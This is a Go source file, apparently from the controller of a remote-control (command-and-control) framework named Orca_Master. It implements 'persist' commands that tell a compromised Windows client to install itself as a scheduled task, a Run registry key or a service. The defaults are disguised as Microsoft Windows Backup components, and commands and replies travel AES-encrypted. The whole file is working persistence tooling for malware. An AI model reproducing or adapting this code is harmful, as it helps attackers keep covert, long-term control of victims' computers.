package controller

import (
	"Orca_Master/cli/cmdopt/persistopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"Orca_Master/tools/util"
	"encoding/json"
	"fmt"
	"github.com/desertbit/grumble"
	"time"
)

var persistCmd = &grumble.Command{
	Name:  "persist",
	Help:  "permission maintenance",
	Usage: "persist tasksch [-h | --help]",
}

var persistTaskschCmd = &grumble.Command{
	Name:  "tasksch",
	Help:  "add windows task-schedule",
	Usage: "persist tasksch [-h | --help] [-n | --name task_name] [-p | --path task_path] [-a | --args task_args] [-t | --time start_time]",
	Flags: func(f *grumble.Flags) {
		f.String("n", "name", "\\Microsoft\\Windows\\WindowsBackup\\BackupTask", "Specify the name of the scheduled task")
		f.String("p", "path", "", "Specifies the path to the scheduled task launcher (default to current path)")
		f.String("a", "args", "", "Add parameters to the scheduled task launcher (default to current args)")
		f.String("t", "time", "", "Add the start time of the scheduled task (format: \"2006-01-02 15:04:05\"), which will be executed one minute after the current time by default")
	},
	Run: func(c *grumble.Context) error {
		if SelectVer[:7] != "windows" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "tasksch is not supported on non-Windows systems")
		}
		taskName := c.Flags.String("name")
		taskPath := c.Flags.String("path")
		taskArgs := c.Flags.String("args")
		flagTaskTime := c.Flags.String("time")
		taskTime := persistopt.CheckTime(flagTaskTime)
		if taskName == "" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please input tasksch name")
			return nil
		}
		type TaskSchStruct struct {
			TaskName string
			TaskPath string
			TaskArgs string
			TaskTime time.Time
		}
		taskSchStruct := TaskSchStruct{
			TaskName: taskName,
			TaskPath: taskPath,
			TaskArgs: taskArgs,
			TaskTime: taskTime,
		}
		marshal, _ := json.Marshal(taskSchStruct)
		data, _ := crypto.Encrypt(marshal, []byte(config.AesKey))
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "persistTaskschAdd", data, util.GenUUID())
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request failed")
			return nil
		}
		select {
		case msg := <-common.DefaultMsgChan:
			message, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(message)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		return nil
	},
}

var persistRegistryCmd = &grumble.Command{
	Name:  "registry",
	Help:  "add windows startup items via registry",
	Usage: "persist registry [-h | --help] [-n | --name registry_name] [-p | --path registry_path] [-a | --args registry_args] [-k | --key registry_key]",
	Flags: func(f *grumble.Flags) {
		f.String("n", "name", "Microsoft Windows Backup", "Specify the name of the registry")
		f.String("p", "path", "", "Specifies the path to the registry launcher (default to current path)")
		f.String("a", "args", "", "Add parameters to the registry launcher (default to current args)")
		f.String("k", "key", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Specify the key of the registry")
	},
	Run: func(c *grumble.Context) error {
		if SelectVer[:7] != "windows" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "tasksch is not supported on non-Windows systems")
		}
		regName := c.Flags.String("name")
		regPath := c.Flags.String("path")
		regArgs := c.Flags.String("args")
		regKey := c.Flags.String("key")
		if regName == "" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please input registry name")
			return nil
		}
		type RegistryStruct struct {
			RegName string
			RegPath string
			RegArgs string
			RegKey  string
		}
		regStruct := RegistryStruct{
			RegName: regName,
			RegPath: regPath,
			RegArgs: regArgs,
			RegKey:  regKey,
		}
		marshal, _ := json.Marshal(regStruct)
		data, _ := crypto.Encrypt(marshal, []byte(config.AesKey))
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "persistRegistryAdd", data, util.GenUUID())
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request failed")
			return nil
		}
		select {
		case msg := <-common.DefaultMsgChan:
			message, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(message)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		return nil
	},
}

var persistSvcCmd = &grumble.Command{
	Name:  "service",
	Help:  "add windows startup items via services",
	Usage: "persist service [-h | --help] [-n | --name svc_name] [-p | --path svc_path] [-a | --args svc_args] [-d | --desc svc_desc] [-s | --started]",
	Flags: func(f *grumble.Flags) {
		f.String("n", "name", "Microsoft Windows Backup", "Specify the name of the service")
		f.String("p", "path", "", "Specifies the path to the service launcher (default to current path)")
		f.String("a", "args", "", "Add parameters to the service launcher (default to current args)")
		f.String("d", "desc", "", "Specify the description of the service")
		f.Bool("s", "started", false, "whether the service is started")
	},
	Run: func(c *grumble.Context) error {
		if SelectVer[:7] != "windows" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "tasksch is not supported on non-Windows systems")
		}
		svcName := c.Flags.String("name")
		svcPath := c.Flags.String("path")
		svcArgs := c.Flags.String("args")
		svcDesc := c.Flags.String("desc")
		svcStarted := c.Flags.Bool("started")
		if svcName == "" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please input service name")
			return nil
		}
		type SvcStruct struct {
			SvcName    string
			SvcPath    string
			SvcArgs    string
			SvcDesc    string
			SvcStarted bool
		}
		regStruct := SvcStruct{
			SvcName:    svcName,
			SvcPath:    svcPath,
			SvcArgs:    svcArgs,
			SvcDesc:    svcDesc,
			SvcStarted: svcStarted,
		}
		marshal, _ := json.Marshal(regStruct)
		data, _ := crypto.Encrypt(marshal, []byte(config.AesKey))
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "persistSvcAdd", data, util.GenUUID())
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request failed")
			return nil
		}
		select {
		case msg := <-common.DefaultMsgChan:
			message, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(message)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		return nil
	},
}
